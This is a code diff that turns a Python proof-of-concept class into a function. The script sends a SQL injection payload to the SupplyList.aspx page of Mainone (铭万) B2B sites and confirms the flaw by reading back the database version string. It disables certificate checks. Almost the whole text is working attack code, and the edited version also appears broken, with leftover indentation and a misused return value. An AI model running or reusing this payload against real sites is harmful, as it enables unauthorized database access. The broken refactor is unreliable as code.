@@ -10,14 +10,7 @@ import sys
 import json
 import requests
 import warnings
-  
-
-
-class mainone_SupplyList_sqli:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['铭万B2B SupplyList SQL注入漏洞','','']
         headers = {
             "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
@@ -26,7 +19,7 @@ class mainone_SupplyList_sqli:
             "strKeyWord":"'AnD 1=ChAr(74)+ChAr(73)+@@VeRsIoN AnD '%'='"
         }
         payload = "/Supply/SupplyList.aspx?ChangeType=0"
-        vulnurl = self.url + payload
+        vulnurl = url + payload
         try:
             req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
             if r"JIMicrosoft" in req.text:
@@ -41,5 +34,4 @@ class mainone_SupplyList_sqli:
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = mainone_SupplyList_sqli(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
